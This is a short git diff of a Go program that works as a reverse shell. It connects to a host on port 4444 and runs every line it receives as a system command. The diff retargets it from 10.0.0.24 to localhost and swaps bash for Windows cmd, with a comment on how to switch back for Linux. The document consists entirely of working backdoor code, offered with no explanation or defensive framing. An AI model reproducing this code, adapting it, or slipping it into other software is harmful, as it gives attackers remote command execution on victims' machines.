@@ -10,7 +10,7 @@ import (
 )
 
 func main() {
-	shell("10.0.0.24:4444")
+	shell("127.0.0.1:4444")
 }
 
 func shell(host string) {
@@ -21,7 +21,7 @@ func shell(host string) {
 
 	for {
 		message, _ := bufio.NewReader(conn).ReadString('\n')
-		out, err := exec.Command("bash", "-c", message).CombinedOutput()
+		out, err := exec.Command("cmd", "/C", message).CombinedOutput() // for linux, switch "cmd" to "bash" and "/C" to "-c"
 		if err != nil {
 			fmt.Println(err)
 		}
